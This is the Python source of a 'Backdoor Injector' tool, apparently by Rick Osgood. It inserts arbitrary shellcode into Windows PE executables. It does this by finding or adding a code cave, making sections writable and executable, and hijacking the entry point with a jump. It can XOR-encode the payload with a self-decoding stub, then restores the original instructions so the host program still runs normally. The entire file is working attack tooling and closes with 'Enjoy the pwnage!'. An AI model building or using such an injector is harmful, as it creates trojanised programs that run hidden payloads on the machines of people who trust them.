#!/usr/bin/python
from capstone import *  # Disassembler
from pefile import *    # PE functions
from keystone import *  # Assembler
import argparse
import mmap
import os

CAVE_SIZE = 1000            # Required size of code cave
BASE_ADDRESS = "0x00400000" # Default base address
XOR_KEY = "0x0F"            # Default key for xor encoding

# Stack alignment commands
PUSHFD = bytearray("\x9c")
PUSHAD = bytearray("\x60")
POPAD = bytearray("\x61")
POPFD = bytearray("\x9d")

# ----------------------------------------------------------------------------
# --- Search through PE and return first code cave found with correct size
# ----------------------------------------------------------------------------
def search_for_code_caves(pe, size, base_address, blacklist, skip_caves):
    code_cave = [] # Store code cave data for later

    # Loop through sections and search for code caves
    section_counter = 0
    cave_counter = 0
    for section in pe.sections:
        skip = False
        for item in blacklist:
            item += "\x00" * (8 - len(item))    # Section names are padded with null bytes to reach 8 bytes
            if section.Name.decode('utf-8') == item:
                print "\t- Skipping blacklisted section " + item
                skip = True
        if skip == False:
            print "\t- Searching section " + section.Name.decode('utf-8')
            print "\t\tSection vAddress: " + hex(base_address + section.VirtualAddress)
            print "\t\tPointer to Raw Data: " + hex(base_address + section.PointerToRawData)

            cave = 0
            counter = 0
            data = bytearray(section.get_data())
            #print "\t\tLength: " + str(data)

            for byte in data:
                #if section_counter == 7:
                #    print hex(byte)
                if byte == 0:
                    cave += 1
                else:
                    if cave >= size:
                        # We found a code cave so let's break
                        break
                    cave = 0
                counter = counter + 1

            # Did we get a big enough code cave?
            if cave >= size:
                cave_counter += 1
                # check for caves we want to skip (user-specified)
                if cave_counter > skip_caves:
                    code_cave.append(base_address + section.VirtualAddress + counter - cave)
                    print "[*] Code cave found: "
                    print "\t- Section: " + section.Name.decode('utf-8')
                    print "\t\tSection vAddress: " + hex(base_address + section.VirtualAddress)
                    code_cave.append(base_address + section.VirtualAddress)
                    print "\t\tPointer to Raw Data: " + hex(base_address + section.PointerToRawData)
                    code_cave.append(base_address + section.PointerToRawData)
                    print "\t\tCave Start Address: " + hex(base_address + section.PointerToRawData + counter - cave)
                    print "\t\tCave End Address: " + hex(base_address + section.PointerToRawData + counter)
                    print "\t\tCave Size: " + hex(cave)
                    print "\t\tSection Original Permissions: " + hex(section.Characteristics)
                    print "[*] Changing section permissions to 0xE0000020..."
                    pe.sections[section_counter].Characteristics = 0xE0000020   # R|W|E|C
                    return code_cave   # We found one so let's quit here

        section_counter += 1

# ----------------------------------------------------------------------------
# --- Some PE's have extra data at the end that are not part of a section
# ----------------------------------------------------------------------------
def test_for_extra_data(pe, filename):
    first_section_roffset = pe.sections[0].PointerToRawData
    total_size = first_section_roffset

    for section in pe.sections:
        print "\t- Section " + section.Name.decode('utf-8') + " size is " + hex(section.SizeOfRawData)
        total_size += section.SizeOfRawData
    print "\n\t- Total claimed size is " + hex(total_size) + " bytes"

    real_size = os.path.getsize(filename)
    difference = real_size - total_size
    print "\t- Real size on disk is " + hex(real_size) + " bytes"
    print "\t- Difference is " + hex(difference)

    if total_size == real_size:
        print "\t- Sizes match up, we can add a section header."
        return 0
    else:
        print "\nWARNING: PE file has overlay data!\n"
        return difference

# Used when adding a new section to PE
def calc_alignment(x, y):
    return((x + y - 1) / y) * y

# Add a new section to the PE when we can't find a suitable code cave
def add_section(pe, filename, size, offset):
    # Setup some variables for calculating the header values
    last_section = pe.FILE_HEADER.NumberOfSections - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    section_count = pe.FILE_HEADER.NumberOfSections
    new_section_offset = (pe.sections[section_count - 1].get_file_offset() + 40)

    # Setup header values
    name = ".bdi" + (4 * "\x00")
    characteristics = 0xE0000020    # R/W/E/C
    raw_size = calc_alignment(size, file_alignment)
    virtual_size = calc_alignment(size, section_alignment)
    raw_offset = calc_alignment((pe.sections[last_section].PointerToRawData + pe.sections[last_section].SizeOfRawData), file_alignment)
    virtual_offset = calc_alignment((pe.sections[last_section].VirtualAddress + pe.sections[last_section].Misc_VirtualSize), section_alignment)

    # Write the header to the PE object
    pe.set_bytes_at_offset(new_section_offset, name)
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))      # Zero out unecessary fields
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    # Edit file header to reflect new section
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset

    #pe.set_bytes_at_offset(virtual_size, ("\x00" * 0x1000))
    print "[*] Adding " + hex(size) + " bytes to PE file..."

    old_name = filename[:-4]
    old_ext = filename[-3:]
    new_name = old_name + "_injected." + old_ext
    pe.write(new_name)

    # Sections must begin on a multiple of the FILE_ALIGNMENT, so even though we may only want 100 bytes added for example,
    # PE library might add more than that. We need to check to see what size our section actually ended up, then expand then
    # file by that actual amount.
    pe2 = PE(new_name)
    new_section_size = pe2.sections[pe2.FILE_HEADER.NumberOfSections - 1].SizeOfRawData

    file = open(new_name, 'a+b')
    map = mmap.mmap(file.fileno(), 0, access=mmap.ACCESS_WRITE)
    # resize file
    map.resize(os.path.getsize(new_name) + new_section_size)

    # Copy extra bytes (if there are extra bytes not included in section headers)
    # They must be moved to the end of the file, after our new section
    if offset != 0:
        print "[*] Moving overlay data to the end of the PE file..."
        map.move(raw_offset + size, raw_offset, offset)

        # Fill the space that used to be the extra bytes with null bytes
        map.seek(raw_offset)
        for i in range(0, offset):
            map.write_byte("\x00")
    map.close()
    file.close()

    return new_name

# After adding a section header, we'll need to pad the end with null bytes
def pad_pe_file(pe, size):
    # Calculate write location
    section_count = pe.FILE_HEADER.NumberOfSections - 1
    #offset = pe.sections[section_count].
    # Now fill that space with 0x00 null bytes
    pe.set_bytes_at_offset(new_section_offset + 40, ("\x00" * size))
    return

# -----------------------------------------------------
# --- Return section object for entry point's section
# -----------------------------------------------------
def find_entry_point_section(pe, entry_point):
    # to save section with entry point
    ep_section = ""
    ep_section_counter = 0
    # Loop through section headers and print
    for section in pe.sections:
        if (entry_point >= section.VirtualAddress) and (entry_point <= (section.VirtualAddress + section.Misc_VirtualSize)):
            # Print section info
            print "\t- Entry point is in the following section:"
            print("\t" + section.Name.decode('utf-8'))
            print("\t\tVirtual Address: " + hex(section.VirtualAddress))
            print("\t\tPointer to Raw Data: " + hex(section.PointerToRawData))
            print("\t\tVirtual Size: " + hex(section.Misc_VirtualSize))
            print("\t\tRaw Size: " + hex(section.SizeOfRawData))
            print("\t\tOriginal Permissions: " + hex(section.Characteristics))
            print "[*] Changing entry point section's permissions to 0xE0000020..."
            pe.sections[ep_section_counter].Characteristics = 0xE0000020
            return section
            break
        ep_section_counter += 1

# ------------------------------------------------------------------
# --- Returns original instruction at original entry point address
# ------------------------------------------------------------------
# For the program's original entry point, we can just overwrite however many bytes we need
# because we know it will execute our JMP code before anything else.
def get_old_instructions_oep(ep_section, entry_point, base_address, jmp_code):
    # Load the first few instructions starting at the entry point
    # x86 instructions should not usually be longer than 15 bytes
    CODE = ep_section.get_data(start=entry_point, length=len(jmp_code))
    old_instruction = ""
    for byte in CODE:
        old_instruction += bytes(byte)

    return old_instruction

# -------------------------------------------------------------------------
# --- Returns original instruction at user-specified entry point address
# -------------------------------------------------------------------------
# If we inject JMP code somewhere in the middle of the EXE's code, we can't just overwrite
# data willy-nilly because the code after our JMP code might be needed at some point. We can only
# overwrite a single instruction. So the instruction must use enough bytes to fit the JMP code.
def get_old_instructions_uep(ep_section, entry_point, base_address, jmp_code):
    # Get the first few bytes from user-specified entry point.
    CODE = ep_section.get_data(start=entry_point, length=len(jmp_code) + 15)

    # Disassemble that section of code
    md = Cs(CS_ARCH_X86, CS_MODE_32)

    # Pull out just the first instruction
    counter = 0
    for instruction in md.disasm(CODE, base_address + entry_point):
        if counter == 0:
            i = instruction
        counter += 1


    old_instruction = bytearray()
    # Test to see if the specified instruction is at least as long as the JMP code
    if len(i.bytes) >= len(jmp_code):
        for byte in i.bytes:
            old_instruction.append(byte)
    else:
        print "ERROR: Specified entry point instruction is not long enough to fit JMP code! QUITTING!"
        exit()

    return old_instruction


# -----------------------------------------------
# --- Builds JMP code to JMP to the shellcode
# -----------------------------------------------
def build_jmp_code(code_caves, base_address, entry_point):
    jmp_offset = code_caves[0] - (base_address + entry_point)

    # Assemble jump code to get to our code cave
    # separate assembly instructions by ; or \n
    CODE = "JMP " + hex(jmp_offset)

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)

    # Build string containing new byte codes
    jmp_instruction = b""
    for byte in encoding:
        jmp_instruction += bytes([byte])

    return jmp_instruction

# Assemble reset code
# - This is executed after our shell code. It overwrites the original entry point instructions with whatever was there before we messed with it.
# - Then we can JMP back to the original entry point again

def build_reset_code(old_instruction, base_address, entry_point):
    CODE = ""
    for byte in reversed(old_instruction):                          # Must reverse due to how the stack works
        CODE += "PUSH " + hex(byte) + ";"                           # PUSH original entry point's opcodes onto stack

    CODE += "MOV ECX, " + hex(len(old_instruction)) + ";"           # Setup loop counter (number of opcodes for original instructions)
    CODE += "MOV EDI, " + hex(base_address + entry_point) + ";"     # Put original entry point address into EDI

    CODE += "loopbegin:;"                                           # Beginning of loop
    CODE += "MOV ESI, ESP;"                                         # Put ESP address into ESI (Address of op codes)
    CODE += "MOVSB;"                                                # Copy byte from ESP address to original entry point
    CODE += "ADD ESP, 0x04;"
    CODE += "loop loopbegin;"

    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    reset_code = ""
    for byte in encoding:
        reset_code += bytes([byte])

    return reset_code

def build_shellcode(shellcode_file):
    # Build shellcode
    shellcode = bytearray(shellcode_file.read() + ("\x90" * 4))
    return shellcode

def build_stack_alignment(stack_align):
    # Assemble stack alignment code
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(stack_align)
    except KsError as e:
        print("ERROR: %s" %e)

    align_code = bytearray()
    for byte in encoding:
        align_code.append(byte)

    # By default leave 8 NOPs so we can manually test alignment code in a debugger if needed
    align_code += bytearray("\x90" * (8 - len(align_code)))

    return align_code

def build_return_jmp_code(shellcode, entry_point, code_caves, base_address):

    shellcode2 = shellcode + POPAD + POPFD

    # calculate offset to JMP back to entry point after SHELLCODE
    current_location = code_caves[0] - base_address + len(shellcode2)
    CODE = "JMP " + hex(entry_point - current_location) + ";"
    # Assemble
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    jmp = ""
    for byte in encoding:
        jmp += bytes([byte])

    shellcode2 += jmp
    return shellcode2

# -------------------------------------------------
# --- Each byte will be xor'd with the same key
# -------------------------------------------------
def encode_xor(code_caves, base_address, shellcode):
    # calculate offset to JMP back to entry point after SHELLCODE
    # assume decoder instructions are 20 bytes long (and add 1 each for PUSHAD and PUSHFD)
    shellcode_start_address = code_caves[0] + 22
    shellcode_end_address = code_caves[0] + 21 + len(shellcode)

    # This ASM will decode xor'd bytes
    CODE =  "MOV EAX, " + hex(shellcode_start_address) + ";"    # Put address of shellcode into EAX
    CODE += "xorloop:"
    CODE += "XOR BYTE PTR DS:[EAX], " + XOR_KEY + ";"           # XOR this byte with 0x0F
    CODE += "INC EAX;"                                          # Increment the memory address of shellcode
    CODE += "CMP EAX, " + hex(shellcode_end_address) + ";"      # Compare current memory address to end of shellcode address
    CODE += "JLE xorloop;"                                      # JMP back to XOR instruction (loop)
    CODE += "NOP;NOP;NOP;NOP;"                                  # Couple of NOPS between the decoder and our shellcode

    # Assemble our decoder
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    decoder = bytearray()
    for byte in encoding:
        decoder.append(byte)

    # Loop through and xor our shellcode
    xord_shellcode = bytearray()
    for byte in shellcode:
        xord_shellcode.append(byte ^ int(XOR_KEY, 16))

    # Copy the decoder code and then the xor'd shellcode into a new shellcode bytearray
    new_shellcode = bytearray()
    for byte in decoder:
        new_shellcode.append(byte)
    for byte in xord_shellcode:
        new_shellcode.append(byte)

    new_shellcode = PUSHFD + PUSHAD + new_shellcode

    return new_shellcode

# ---------------------------------------------------------
# --- Each time we xor a byte, the xor key is incremented
# ---------------------------------------------------------
def encode_xor_rolling(code_caves, base_address, shellcode):
    # calculate offset to JMP back to entry point after SHELLCODE
    # assume decoder instructions are 22 bytes long (and add 1 each for PUSHAD and PUSHFD)
    shellcode_start_address = code_caves[0] + 24
    shellcode_end_address = code_caves[0] + 23 + len(shellcode)

    # This ASM will decode xor'd bytes
    CODE =  "MOV EAX, " + hex(shellcode_start_address) + ";"    # Put address of shellcode into EAX
    CODE += "MOV BL, " + XOR_KEY + ";"                          # BL will hold the rolling xor key
    CODE += "xorloop:"
    CODE += "XOR BYTE PTR DS:[EAX], BL;"                        # XOR this byte with BL key
    CODE += "INC EAX;"                                          # Increment the memory address of shellcode
    CODE += "INC EBX;"                                          # increment rolling key
    CODE += "CMP EAX, " + hex(shellcode_end_address) + ";"      # Compare current memory address to end of shellcode address
    CODE += "JLE xorloop;"                                      # JMP back to XOR instruction (loop)
    CODE += "NOP;NOP;NOP;NOP;"                                  # Couple of NOPS between the decoder and our shellcode

    # Assemble our decoder
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    decoder = bytearray()
    for byte in encoding:
        decoder.append(byte)

    # Loop through and xor our shellcode
    rolling_key = int(XOR_KEY, 16)
    xord_shellcode = bytearray()
    for byte in shellcode:
        xord_shellcode.append(byte ^ rolling_key)
        rolling_key += 1
        if rolling_key > 255:
            rolling_key = 0

    # Copy the decoder code and then the xor'd shellcode into a new shellcode bytearray
    new_shellcode = bytearray()
    for byte in decoder:
        new_shellcode.append(byte)
    for byte in xord_shellcode:
        new_shellcode.append(byte)

    new_shellcode = PUSHFD + PUSHAD + new_shellcode

    return new_shellcode

# -----------------------------------------------------------------------------------------------------
# --- Each time we xor a byte, the xor key is incremented by the number of bytes we've XOR'd already
# -----------------------------------------------------------------------------------------------------
def encode_xor_rolling2(code_caves, base_address, shellcode):
    # calculate offset to JMP back to entry point after SHELLCODE
    # assembled decoder instructions are 27 bytes long (and add 1 each for PUSHAD and PUSHFD)
    shellcode_start_address = code_caves[0] + 27 + 2
    shellcode_end_address = code_caves[0] + 27 + 1 + len(shellcode)

    # This ASM will decode xor'd bytes
    CODE =  "MOV EAX, " + hex(shellcode_start_address) + ";"    # Put address of shellcode into EAX
    CODE += "MOV BL, " + XOR_KEY + ";"                          # BL will hold the rolling xor key
    CODE += "XOR ECX, ECX;"                                     # Clear ECX counter register
    CODE += "xorloop:"
    CODE += "XOR BYTE PTR DS:[EAX], BL;"                        # XOR this byte with BL key
    CODE += "INC EAX;"                                          # Increment the memory address of shellcode
    CODE += "ADD BL, CL;"                                       # Adjust rolling key
    CODE += "INC CL;"                                           # Increment counter
    CODE += "CMP EAX, " + hex(shellcode_end_address) + ";"      # Compare current memory address to end of shellcode address
    CODE += "JLE xorloop;"                                      # JMP back to XOR instruction (loop)
    CODE += "NOP;NOP;NOP;NOP;"                                  # Couple of NOPS between the decoder and our shellcode

    # Assemble our decoder
    try:
        # Initialize engine in X86-32bit mode
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        encoding, count = ks.asm(CODE)
    except KsError as e:
        print("ERROR: %s" %e)
    decoder = bytearray()
    for byte in encoding:
        decoder.append(byte)

    # Loop through and xor our shellcode
    rolling_key = int(XOR_KEY, 16)
    xord_shellcode = bytearray()
    counter = 0
    for byte in shellcode:
        xord_shellcode.append(byte ^ rolling_key)
        rolling_key += counter
        if rolling_key > 255:
            rolling_key = rolling_key - 256
        counter += 1
        if counter > 255:
            counter = 0

    # Copy the decoder code and then the xor'd shellcode into a new shellcode bytearray
    new_shellcode = bytearray()
    for byte in decoder:
        new_shellcode.append(byte)
    for byte in xord_shellcode:
        new_shellcode.append(byte)

    new_shellcode = PUSHFD + PUSHAD + new_shellcode

    return new_shellcode


def write_new_pe(pe, filename, entry_point, ep_section, jmp_instruction, code_caves, shellcode, base_address):
    # Write new entry point instruction to exe
    pe.set_bytes_at_offset(entry_point - (ep_section.VirtualAddress - ep_section.PointerToRawData), jmp_instruction)
    # Write shellcode to exe
    pe.set_bytes_at_offset(code_caves[0] - base_address - (code_caves[1] - code_caves[2]), shellcode)

    old_name = filename[:-4]
    old_ext = filename[-3:]
    print "[*] Saving to " + old_name + "_injected." + old_ext + "..."
    pe.write(old_name + "_injected." + old_ext)


# ------------------------------------
# --- Main Loop
# ------------------------------------
def main():
    # Start by obtaining user arguments
    parser = argparse.ArgumentParser(description='Codecave injector\nBy: Rick Osgood')
    parser.add_argument("--pefile", required=True, help="Path to Windows executable PE file to inject.")
    parser.add_argument("--shellcode", required=True, help="Path to shellcode binary file, e.g. msfvenom -f raw")
    parser.add_argument("--base_address", required=False, default=BASE_ADDRESS, help="Base address of pe file when executed on target platform. (0x00400000)")
    parser.add_argument("--encoding", required=False, default="none", help="Encode your shellcode. (none, xor, xor_rolling) Default=none")
    parser.add_argument("--entry_point", required=False, default="none", help="Memory address where injector will hijack code execution. Default=Program entry point")
    parser.add_argument("--stack_align", required=False, default="NOP;NOP;NOP;NOP;NOP;NOP;NOP;NOP;", help="Optional ASM instructions (up to 8 bytes) to re-align stack before returning to program. (ADD ESP,0x204)")
    parser.add_argument("--skip_cave", required=False, default=0, help="Skip N number of discovered caves. Useful if a cave isn't working.")
    parser.add_argument("--blacklist", required=False, default="", help="Comma-separated list of sections to skip injection. (\".data,.rdata\"). Useful if a cave isn't working.")
    args = parser.parse_args()

    base_address = int(args.base_address, 16)
    blacklist = args.blacklist.split(',')

    print """######                                                      ###
#     #   ##    ####  #    # #####   ####   ####  #####      #  #    #      # ######  ####  #####  ####  #####
#     #  #  #  #    # #   #  #    # #    # #    # #    #     #  ##   #      # #      #    #   #   #    # #    #
######  #    # #      ####   #    # #    # #    # #    #     #  # #  #      # #####  #        #   #    # #    #
#     # ###### #      #  #   #    # #    # #    # #####      #  #  # #      # #      #        #   #    # #####
#     # #    # #    # #   #  #    # #    # #    # #   #      #  #   ## #    # #      #    #   #   #    # #   #
######  #    #  ####  #    # #####   ####   ####  #    #    ### #    #  ####  ######  ####    #    ####  #    #"""
    print "By: Rick Osgood"
    print ""

    # Load file as pe object
    print "[*] Loading pe file..."
    pe = PE(args.pefile)

    print "[*] Loading shellcode file..."
    # Load shellcode from file
    shellcode_file = open(args.shellcode)
    # And create first portion of shellcode
    shellcode = build_shellcode(shellcode_file)
    print "\t- Shellcode length: " + hex(len(shellcode))

    # Grab the exe's entry point virtual offset
    if args.entry_point == "none":
        print "[*] Entry point not specified. Using program original entry point."
        entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    else:
        entry_point = int(args.entry_point, 16)
        entry_point = entry_point - base_address
    print "\t- Using entry point: " + hex(entry_point + base_address)

    print "[*] Locating entry point section..."
    ep_section = find_entry_point_section(pe, entry_point)

    # Need to know about how long our decoder shellcode is so we can make sure the code cave is big enough to fit it
    if args.encoding == "xor":
        decoder_length = 20
    elif args.encoding == "xor_rolling":
        decoder_length = 22
    elif args.encoding == "xor_rolling2":
        decoder_length = 27
    else:
        decoder_length = 0

    return_jmp_length = 5
    print "[*] Searching for a suitable code cave..."
    code_cave_size = decoder_length + len(shellcode) + return_jmp_length
    code_caves = search_for_code_caves(pe, code_cave_size, base_address, blacklist, int(args.skip_cave))
    if not code_caves:
        print "[*] No code caves found! Adding new section to PE with size " + hex(code_cave_size) + ".."
        offset = test_for_extra_data(pe, args.pefile)
        new_filename = add_section(pe, args.pefile, code_cave_size, offset)
        pe = PE(new_filename)
        print "[*] Searching for newly created code cave..."
        code_caves = search_for_code_caves(pe, code_cave_size, base_address, blacklist, int(args.skip_cave))
        if not code_caves:
            print "ERROR: Unable to find code cave even after adding section. QUITTING!"
            exit()

    if args.encoding == "xor":
        print "[*] Encoding shellcode with xor and adding decoder function..."
        shellcode = encode_xor(code_caves, base_address, shellcode)
    elif args.encoding == "xor_rolling":
        print "[*] Encoding shellcode with xor_rolling and adding decoder function..."
        shellcode = encode_xor_rolling(code_caves, base_address, shellcode)
    elif args.encoding == "xor_rolling2":
        print "[*] Encoding shellcode with xor_rolling2 and adding decoder function..."
        shellcode = encode_xor_rolling2(code_caves, base_address, shellcode)
    else:
        shellcode = PUSHFD + PUSHAD + shellcode

    print "[*] Locating offset from shellcode to entry point..."
    jmp_instruction = build_jmp_code(code_caves, base_address, entry_point)

    print "[*] Saving original instructions at entry point..."
    # If the entry point is the program's original entry point, we can just overwrite the first X bytes with no worries
    if entry_point == pe.OPTIONAL_HEADER.AddressOfEntryPoint:
        old_instruction = get_old_instructions_oep(ep_section, entry_point, base_address, jmp_instruction)
    else:
        # If the entry point is in the middle of the code, we can only safely overwrite a single instruction.
        old_instruction = get_old_instructions_uep(ep_section, entry_point, base_address, jmp_instruction)

    print "[*] Building code to reset entry point to normal..."
    reset_code = build_reset_code(old_instruction, base_address, entry_point)
    shellcode += reset_code

    if args.stack_align != ("NOP;" * 8):
        print "[*] Adding stack re-alignment code..."
    stack_align = build_stack_alignment(args.stack_align)
    shellcode += stack_align

    print "[*] Building final shellcode.."
    # Finish building shellcode
    shellcode = build_return_jmp_code(shellcode, entry_point, code_caves, base_address)

    print "[*] Saving new file..."
    # Create the new, modified exe file
    write_new_pe(pe, args.pefile, entry_point, ep_section, jmp_instruction, code_caves, shellcode, base_address)

    print ""
    print "All done! Enjoy the pwnage! >:D"

if __name__ == '__main__':
    main()
